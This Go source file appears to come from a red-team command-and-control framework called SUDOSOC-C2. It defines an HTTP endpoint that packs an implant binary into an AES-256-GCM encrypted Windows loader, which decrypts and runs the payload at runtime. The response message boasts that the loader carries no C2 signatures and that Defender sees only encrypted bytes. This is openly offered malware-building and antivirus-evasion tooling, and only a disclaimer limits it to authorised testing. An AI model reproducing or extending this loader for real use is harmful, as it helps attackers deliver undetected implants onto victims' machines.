package web

/*
	SUDOSOC-C2 — /api/generate/pack endpoint
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	POST /api/generate/pack
	  body:  { "binary_path": "/abs/path/to/implant.exe",
	           "implant_name": "myimplant",
	           "is_shellcode": false }
	  resp:  { "path": "/abs/path/to/myimplant_packed.exe",
	           "message": "..." }
*/

import (
	"encoding/json"
	"net/http"
	"path/filepath"
	"strings"

	"github.com/sudosoc/SUDOSOC-C2/server/assets"
	"github.com/sudosoc/SUDOSOC-C2/server/generate"
)

type packReq struct {
	BinaryPath  string `json:"binary_path"`
	ImplantName string `json:"implant_name"`
	IsShellcode bool   `json:"is_shellcode"`
}

type packResp struct {
	Path    string `json:"path"`
	Message string `json:"message"`
}

// handleGeneratePack encrypts an implant binary with AES-256-GCM and compiles
// a Go loader that decrypts + executes the payload at runtime.
func handleGeneratePack(w http.ResponseWriter, r *http.Request) {
	var req packReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.BinaryPath == "" {
		jsonError(w, "binary_path is required", http.StatusBadRequest)
		return
	}

	// Security: only pack files that live in allowed directories
	abs := filepath.Clean(req.BinaryPath)
	sliversDir := generate.GetSliversDir()
	tmpDir := "/tmp"

	if !strings.HasPrefix(abs, sliversDir) &&
		!strings.HasPrefix(abs, tmpDir) {
		jsonError(w, "path not in allowed directories", http.StatusForbidden)
		return
	}

	name := req.ImplantName
	if name == "" {
		name = "implant"
	}

	appDir := assets.GetRootAppDir()

	packed, err := generate.PackWindows(abs, name, req.IsShellcode, appDir)
	if err != nil {
		jsonError(w, "pack failed: "+err.Error(), http.StatusInternalServerError)
		return
	}

	_ = json.NewEncoder(w).Encode(packResp{
		Path: packed,
		Message: "AES-256-GCM encrypted loader ready. " +
			"The loader has zero C2 signatures — " +
			"Defender sees only encrypted bytes until runtime.",
	})
}
